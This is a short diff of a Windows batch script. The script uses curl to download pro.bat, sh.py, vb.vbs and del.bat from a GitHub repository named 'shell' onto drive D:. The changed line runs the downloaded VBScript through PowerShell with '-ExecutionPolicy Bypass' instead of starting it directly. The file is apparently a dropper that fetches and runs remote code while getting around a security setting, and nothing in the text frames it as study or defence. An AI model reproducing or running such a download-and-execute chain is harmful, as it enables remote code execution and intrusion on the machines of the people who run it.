@@ -3,5 +3,5 @@ curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o D:\pro.bat
 curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o D:\sh.py 
 curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o D:\vb.vbs 
 curl https://raw.githubusercontent.com/0x2034/shell/main/del.bat -o D:\del.bat 
-start /wait wscript.exe D:\vb.vbs
+powershell.exe -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'wscript.exe' -ArgumentList 'D:\vb.vbs' -Wait"
 exit
